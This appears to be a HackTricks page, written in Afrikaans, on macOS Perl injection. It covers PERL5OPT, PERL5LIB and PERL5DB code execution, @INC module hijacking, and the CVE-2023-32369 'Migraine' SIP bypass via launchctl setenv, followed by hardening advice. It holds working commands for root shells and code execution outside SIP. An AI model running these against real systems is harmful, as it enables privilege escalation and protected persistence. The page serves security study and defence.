# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

Deur die env variable **`PERL5OPT`** te gebruik, is dit moontlik om **Perl** willekeurige opdragte te laat uitvoer wanneer die interpreter begin (selfs **voordat** die eerste reël van die teikenskrip geparse word).
Skep byvoorbeeld hierdie skrip:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Voer nou die **env variable** uit en voer die **perl**-script uit:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Nog ’n opsie is om ’n Perl-module te skep (bv. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
En gebruik dan die env-veranderlikes sodat die module outomaties opgespoor en gelaai word:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Ander interessante omgewingsveranderlikes

* **`PERL5DB`** – wanneer die interpreter met die **`-d`** (debugger)-flag gestart word, word die inhoud van `PERL5DB` as Perl-code *binne* die debugger-konteks uitgevoer.
As jy beide die omgewing **en** die command-line flags van ’n geprivilegeerde Perl-proses kan beïnvloed, kan jy iets soos die volgende doen:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`** – op Windows beheer hierdie veranderlike watter shell executable Perl sal gebruik wanneer dit ’n shell moet spawn. Dit word hier slegs vir volledigheid genoem, aangesien dit nie relevant op macOS is nie.

Hoewel `PERL5DB` die **`-d`**-switch vereis, is dit algemeen om maintenance- of installer-scripts te vind wat as *root* met hierdie flag geaktiveer uitgevoer word vir verbose troubleshooting, wat die veranderlike ’n geldige escalation vector maak.

## Via dependencies (@INC abuse)

Dit is moontlik om die include path te lys waarna Perl sal soek (**`@INC`**) deur die volgende uit te voer:
```bash
perl -e 'print join("\n", @INC)'
```
Tipiese uitvoer op macOS 13/14 lyk soos:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Sommige van die teruggestuurde vouers bestaan nie eens nie; **`/Library/Perl/5.30`** bestaan egter wel, word *nie* deur SIP beskerm nie en is *voor* die SIP-beskermde vouers. As jy dus as *root* kan skryf, kan jy ’n kwaadwillige module (bv. `File/Basename.pm`) plaas wat *voorkeurgewys* gelaai sal word deur enige bevoorregte script wat daardie module invoer.

> [!WARNING]
> Jy benodig steeds **root** om binne **`/Library/Perl`** te skryf, en macOS sal ’n **TCC**-prompt vertoon wat vra vir *Full Disk Access* vir die proses wat die skryfbewerking uitvoer.

Byvoorbeeld, indien ’n script **`use File::Basename;`** invoer, sou dit moontlik wees om `/Library/Perl/5.30/File/Basename.pm` te skep wat kode bevat wat deur die aanvaller beheer word.

## SIP-omseiling via Migration Assistant (CVE-2023-32369 “Migraine”)

In Mei 2023 het Microsoft **CVE-2023-32369**, met die bynaam **Migraine**, bekend gemaak: ’n post-exploitation-tegniek wat ’n *root*-aanvaller toelaat om System Integrity Protection (SIP) volledig te **omseil**.
Die kwesbare komponent is **`systemmigrationd`**, ’n daemon met die **`com.apple.rootless.install.heritable`**-entitlement. Enige child process wat deur hierdie daemon geskep word, erf die entitlement en loop dus **buite** SIP-beperkings.<sup>[1]</sup>

Onder die children wat deur die navorsers geïdentifiseer is, is die Apple-ondertekende interpreter:<sup>[1]</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Omdat Perl `PERL5OPT` eerbiedig (en Bash `BASH_ENV` eerbiedig), is dit genoeg om die daemon se *omgewing* te vergiftig om willekeurige kode-uitvoering in ’n SIP-less konteks te verkry:<sup>[1][2]</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Wanneer `migrateLocalKDC` loop, begin `/usr/bin/perl` met die kwaadwillige `PERL5OPT` en voer `/private/tmp/migraine.sh` uit *voordat SIP heraktiveer word*. Vanuit daardie script kan jy byvoorbeeld ’n payload binne **`/System/Library/LaunchDaemons`** kopieer of die `com.apple.rootless`-uitgebreide kenmerk toewys om ’n lêer **onverwyderbaar** te maak.

Apple het die probleem in macOS **Ventura 13.4**, **Monterey 12.6.6** en **Big Sur 11.7.7** reggestel, maar ouer of ongepatchte stelsels bly uitbuitbaar.<sup>[1]</sup>

## Verhardingsaanbevelings

1. **Vee gevaarlike veranderlikes uit** – geprivilegieerde launchdaemons of cron jobs behoort met ’n skoon omgewing te begin (`launchctl unsetenv PERL5OPT`, `env -i`, ens.).
2. **Vermy dit om interpreters as root uit te voer** tensy dit streng noodsaaklik is. Gebruik saamgestelde binaries of verlaag vroegtydig die privileges.
3. **Verskaf scripts met `-T` (taint mode)** sodat Perl `PERL5OPT` en ander onveilige skakelaars ignoreer wanneer taint-kontrole geaktiveer is.
4. **Hou macOS op datum** – “Migraine” is volledig reggestel in huidige weergawes.

## Verwysings

- [1] [Microsoft Security Blog – Nuwe macOS-kwesbaarheid, Migraine, kan System Integrity Protection omseil (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
